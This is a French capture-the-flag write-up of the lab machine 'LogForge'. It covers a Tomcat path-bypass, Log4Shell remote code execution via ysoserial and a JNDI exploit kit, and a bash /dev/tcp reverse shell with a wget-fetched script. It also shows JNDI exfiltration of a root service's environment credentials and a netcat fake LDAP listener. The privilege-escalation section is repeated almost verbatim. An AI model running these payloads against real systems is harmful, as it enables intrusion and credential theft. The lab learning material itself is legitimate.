![Cover](cover.png)

### Énumération et Scanning

Je commence par une phase classique de reconnaissance avec **Nmap** pour identifier la surface d'attaque.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.138

# Scan de services détaillé sur les ports identifiés
nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.138
```

Le scan révèle :
*   **Port 22** : SSH (OpenSSH 8.2p1).
*   **Port 80** : HTTP (Apache httpd 2.4.41).
*   **Ports filtrés** : 21 (FTP) et 8080 (HTTP-proxy).

L'analyse des headers HTTP montre la présence d'un cookie **JSESSIONID**, ce qui confirme un environnement **Java (J2EE)**. En provoquant une erreur 404, le serveur révèle sa version : **Apache Tomcat 9.0.31**.

### Énumération Web et Directory Brute Force

J'utilise **feroxbuster** pour découvrir des points d'entrée spécifiques à Java.

```bash
feroxbuster -u http://10.10.11.138 -x jsp,java,class
```

Les résultats affichent des codes **403 Forbidden** pour `/admin` et `/manager`. Ces répertoires sont critiques car ils permettent normalement la gestion des applications Tomcat.

### Contournement des restrictions (Orange Tsai Bypass)

Le serveur utilise Apache comme **Reverse Proxy** devant Tomcat. Je suspecte une restriction d'accès basée sur l'URL au niveau d'Apache. En utilisant une technique de **Path Traversal** spécifique au parsing différentiel entre Apache et Tomcat (présentée par Orange Tsai), je tente d'accéder au manager.

> **Schéma Mental : Bypass de Proxy**
> 1. **Apache** reçoit `/0xdf/..;/manager/`. Il ne voit pas de correspondance avec la règle de restriction `/manager`.
> 2. **Apache** transmet la requête à **Tomcat**.
> 3. **Tomcat** interprète `..;` comme une instruction de remontée de répertoire et normalise l'URL en `/manager/`.
> 4. La restriction est contournée.

L'accès à `http://10.10.11.138/0xdf/..;/manager/html` demande une **HTTP Basic Auth**. Les identifiants par défaut `tomcat:tomcat` fonctionnent, me donnant accès au **Tomcat Manager App**.

### Vecteur d'entrée : Log4Shell (CVE-2021-44228)

Bien que l'upload de fichiers **WAR** soit désactivé (limite de taille fixée à 1 octet), le nom de la machine "LogForge" suggère une vulnérabilité liée aux logs. Je teste une injection **JNDI** (Java Naming and Directory Interface) dans les champs de saisie du manager, notamment dans le paramètre `idle` de la fonction "Expire sessions".

#### Preuve de Concept (PoC)
Je prépare une écoute pour intercepter un callback **LDAP**.

```bash
# Sur ma machine d'attaque
sudo tcpdump -ni tun0 port 389
```

J'envoie le payload suivant via une requête POST :
`${jndi:ldap://10.10.14.6/file}`

Le serveur cible tente immédiatement une connexion sortante vers mon IP sur le port 389, confirmant que la bibliothèque **Log4j** interprète les expressions JNDI.

### Exploitation et Premier Shell

Pour transformer cette vulnérabilité en **RCE (Remote Code Execution)**, je dois fournir un objet Java sérialisé malveillant via un serveur LDAP factice.

> **Schéma Mental : Chaîne d'attaque Log4Shell**
> 1. **Injection** : Envoi du payload `${jndi:ldap://ATTACKER_IP/Exploit}`.
> 2. **Lookup** : Log4j déclenche une requête LDAP vers l'attaquant.
> 3. **Response** : Le serveur LDAP de l'attaquant répond avec une référence vers une classe Java ou un objet sérialisé.
> 4. **Execution** : Tomcat télécharge et exécute le code pour désérialiser l'objet.

J'utilise **ysoserial** pour générer un payload basé sur la librairie **CommonsCollections5** et **JNDI-Exploit-Kit** pour servir l'attaque.

```bash
# 1. Création du script de reverse shell
echo "#!/bin/bash" > rev.sh
echo "bash -i >& /dev/tcp/10.10.14.6/443 0>&1" >> rev.sh

# 2. Génération du payload de téléchargement via ysoserial
java -jar ysoserial.jar CommonsCollections5 'wget 10.10.14.6/rev.sh -O /dev/shm/rev.sh' > getrev.ser

# 3. Lancement du serveur d'exploitation LDAP
sudo java -jar JNDI-Injection-Exploit.jar -P getrev.ser -L 10.10.14.6:389
```

Après avoir déclenché le téléchargement du script, je génère un second payload pour l'exécuter :

```bash
java -jar ysoserial.jar CommonsCollections5 'bash /dev/shm/rev.sh' > runrev.ser
```

Je redémarre le kit d'exploitation avec `runrev.ser`, je lance un listener `nc -lnvp 443`, et j'injecte à nouveau le payload JNDI dans le champ `idle`. Je reçois une connexion : j'ai un shell en tant qu'utilisateur **tomcat**.

```bash
tomcat@LogForge:/var/lib/tomcat9$ id
uid=110(tomcat) gid=115(tomcat) groups=115(tomcat)
```

---

### Énumération Interne

Une fois le pied posé sur la machine en tant qu'utilisateur `tomcat`, ma priorité est l'énumération des services locaux et des vecteurs de **Privilege Escalation**. L'analyse des ports ouverts en local révèle des services non exposés à l'extérieur.

```bash
# Vérification des ports en écoute
netstat -tnlp

# Identification des processus tournant avec des privilèges élevés
ps auxww | grep ftp
```

Je remarque que le port **TCP 21** (FTP) est filtré et n'accepte que les connexions provenant de `localhost`. Plus intéressant encore, le service FTP est géré par une archive Java située à la racine : `/root/ftpServer-1.0-SNAPSHOT-all.jar`. Ce processus tourne avec les privilèges **root**.

---

### Analyse du vecteur d'attaque (Reverse Engineering)

Pour comprendre comment interagir avec ce serveur FTP, je transfère le fichier JAR sur ma machine d'attaque pour une analyse statique via **JD-GUI**.

> Schéma Mental :
> 1. **Source** : Le serveur FTP accepte une entrée utilisateur (le username).
> 2. **Sink** : Cette entrée est passée directement à un logger **Log4j**.
> 3. **Objectif** : Utiliser une injection **JNDI** pour exfiltrer des données sensibles stockées en mémoire.

L'examen du code source révèle deux points critiques :
1.  **Vulnérabilité Log4Shell** : Dans la classe `Worker`, la méthode `handleUser` logue les tentatives de connexion infructueuses avec un niveau `WARN`, incluant directement le `username` fourni par l'utilisateur.
2.  **Secrets en variables d'environnement** : Les identifiants valides ne sont pas codés en dur mais récupérés via `System.getenv("ftp_user")` et `System.getenv("ftp_password")`.

```java
// Extrait de la classe Worker.class
private void handleUser(String username) {
    LOGGER.warn("Login with invalid user: " + username); // Point d'injection
    if (username.toLowerCase().equals(this.validUser)) {
        // ...
    }
}

private String validUser = System.getenv("ftp_user");
private String validPassword = System.getenv("ftp_password");
```

---

### Mouvement Latéral & Exfiltration de données

Puisque le serveur FTP utilise une version vulnérable de **Log4j**, je peux exploiter les **Lookups** JNDI pour forcer le serveur à envoyer des requêtes **LDAP** vers ma machine. En encapsulant les variables d'environnement dans le chemin de l'URL LDAP, je peux les intercepter.

#### 1. Préparation de l'écouteur
J'utilise `tcpdump` ou un simple `nc` combiné à `xxd` pour capturer les requêtes entrantes et visualiser les données exfiltrées.

```bash
# Capture des requêtes LDAP sur le port 389
sudo tcpdump -ni tun0 port 389 -A
```

#### 2. Injection JNDI via FTP
Je me connecte au service FTP local depuis mon shell `tomcat` et j'injecte le payload dans le champ `USER`. Le format `${env:VARIABLE}` permet de résoudre la variable d'environnement avant l'envoi de la requête.

```bash
# Connexion locale
ftp localhost

# Injection pour exfiltrer le username et le password
Name (localhost:tomcat): ${jndi:ldap://10.10.14.6/user:${env:ftp_user}:pass:${env:ftp_password}}
```

#### 3. Interception des secrets
Sur ma machine d'attaque, la requête LDAP arrive. Le chemin de l'URL contient les valeurs résolues des variables d'environnement du processus **root**.

> Schéma Mental :
> `Payload` -> `Log4j` -> `Lookup Engine` -> `Resolution de ${env:...}` -> `Requête LDAP vers l'attaquant` -> `Leak des credentials`.

---

### Escalade de Privilèges (Root)

Une fois les identifiants `ftp_user` et `ftp_password` récupérés (ex: `ippsec` : `[REDACTED]`), je teste leur validité pour une authentification système. Il est fréquent que les administrateurs réutilisent les mots de passe de services pour les comptes utilisateurs ou le compte **root**.

```bash
# Tentative de passage en root avec le mot de passe exfiltré
su -
```

Le mot de passe récupéré via la fuite mémoire de **Log4j** me permet d'obtenir un shell interactif avec les privilèges maximaux. Je peux désormais lire le flag final dans `/root/root.txt`.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le pied posé sur la machine en tant qu'utilisateur `tomcat`, l'objectif est d'identifier des vecteurs de mouvement latéral ou d'élévation verticale. L'énumération des ports locaux révèle un service **FTP** (port 21) filtré, inaccessible de l'extérieur.

#### Énumération et Analyse du Service Interne
L'inspection des processus montre qu'un serveur FTP Java tourne avec les privilèges **root**. Le fichier JAR associé se trouve à la racine : `/ftpServer-1.0-SNAPSHOT-all.jar`.

```bash
# Identification du processus root
ps auxww | grep ftp
# Analyse des connexions locales
netstat -tnlp | grep :21
```

Après avoir récupéré le JAR pour analyse locale via un **Decompiler** (type `jd-gui`), j'identifie deux points critiques dans la classe `Worker` :
1.  **Sink de vulnérabilité** : La méthode `handleUser` logue les tentatives de connexion échouées via **Log4j** sans assainissement : `LOGGER.warn("Login with invalid user: " + username);`.
2.  **Secrets en mémoire** : Les identifiants valides sont récupérés depuis des **Environment Variables** : `ftp_user` et `ftp_password`.

> **Schéma Mental : Exfiltration par Injection JNDI**
> 1. L'attaquant se connecte au FTP local.
> 2. Il injecte une charge **Log4j** dans le champ `USER`.
> 3. Le serveur FTP (root) traite le log.
> 4. **Log4j** interprète le lookup `${env:VAR}`.
> 5. Le serveur initie une requête **LDAP** vers l'attaquant, incluant la valeur de la variable dans l'URL.

#### Exfiltration des Secrets via Log4Shell
Puisque le serveur FTP tourne sous Java et utilise une version vulnérable de **Log4j**, je peux utiliser les **JNDI Lookups** pour forcer le serveur à me transmettre ses variables d'environnement.

Je prépare une écoute avec `tcpdump` ou `Wireshark` sur ma machine d'attaque, puis je déclenche la fuite de données depuis le shell `tomcat` :

```bash
# Connexion au FTP local et injection pour exfiltrer l'utilisateur
ftp localhost
# Name: ${jndi:ldap://10.10.14.6/user:${env:ftp_user}}

# Injection pour exfiltrer le mot de passe
# Name: ${jndi:ldap://10.10.14.6/pass:${env:ftp_password}}
```

Côté attaquant, la requête **LDAP** entrante révèle les credentials dans le **Path** de l'URL :
*   `ftp_user` : `ippsec`
*   `ftp_password` : `[REDACTED_PASSWORD]`

#### Compromission Totale (Root)
Le mot de passe récupéré est réutilisé pour le compte **root** du système. Une simple commande `su -` permet d'obtenir une domination totale.

```bash
# Passage en root
su -
# Lecture du flag final
cat /root/root.txt
```

---

### Analyse Post-Exploitation : Beyond Root

L'exploitation de **Log4Shell** dans ce scénario ne nécessite pas forcément un **Exploit Kit** complexe si l'on cherche uniquement à lire des données. L'analyse du protocole **LDAP** au niveau binaire permet de comprendre comment intercepter ces informations avec des outils minimalistes.

#### Interception LDAP avec Netcat
Il est possible de simuler un serveur LDAP rudimentaire capable de répondre positivement à un **Bind Request** pour forcer le client à envoyer sa requête de recherche (**Search Request**) contenant nos données exfiltrées.

```bash
# Simulation d'un LDAP Bind Response (Success) via echo et nc
echo -e '0\x0c\x02\x01\x01a\x07\x0a\x01\x00\x04\x00\x04\00' | nc -nvv -l -p 389 | xxd
```

#### Analyse du Protocole Binaire
Le protocole **LDAP** utilise l'encodage **ASN.1 BER** (Basic Encoding Rules). Une requête se décompose en `[Type] [Length] [Value]`.
*   **Bind Request** : Le client initie la session. Notre réponse `0x61` (Bind Response) avec un code `0x00` (success) valide l'étape.
*   **Search Request** (`0x63`) : C'est ici que le client transmet l'URL JNDI. Dans le dump hexadécimal, on retrouve les chaînes de caractères correspondant aux variables d'environnement après le tag `0x04` (Octet String).

Cette méthode "low-tech" est particulièrement efficace en environnement restreint où l'installation de serveurs LDAP complets (comme `marshalsec`) est impossible ou trop bruyante.